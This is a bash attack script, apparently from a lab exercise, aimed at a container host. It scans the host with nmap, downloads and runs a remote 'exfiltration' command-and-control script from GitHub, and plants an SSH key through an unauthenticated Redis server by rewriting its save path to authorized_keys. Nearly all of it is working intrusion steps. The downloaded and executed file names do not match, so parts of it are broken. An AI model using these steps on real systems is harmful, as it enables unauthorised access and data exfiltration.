#!/bin/bash

echo "Installing dependencies..."
#
sudo apt update -y
sudo apt install build-essential -y
sudo apt install curl -y
sudo apt-get -y install net-tools
sudo apt-get install -y iputils-ping
sudo apt-get -y install software-properties-common
sudo apt install -y less
sudo apt install -y unzip
sudo apt install -y nano
sudo apt install iproute2 -y
sudo apt -y install make gcc
sudo apt install redis -y
sudo apt install nmap -y

echo "[+] Conducting NMAP scan.."
nmap -sC -p- 172.18.0.2 -T4 --min-rate 10000

# [Exfiltration] Set up C&C server
echo "[+] Setting up C&C server..."

cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_exfiltration_attk.sh && chmod +x exfiltration_attk.sh
./exfiltration_attk.sh

# [Exfiltration] Install script for attacker to decrypt and extract the exfiltrated file
cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_after_exfiltration_attk.sh && chmod +x after_exfiltration_attk.sh

# [Initial access] Automated
echo "[+] Setting up initial access..."

cd ~
mkdir .ssh
ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""
cd .ssh
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > 1.txt
cat 1.txt | redis-cli -h 172.18.0.2 -x set sshkey
sleep 5
printf "keys *\nconfig set dir /home/resch/.ssh\nconfig set dbfilename 'authorized_keys'\nsave\nexit" | redis-cli -h 172.18.0.2

echo "[+] Done."
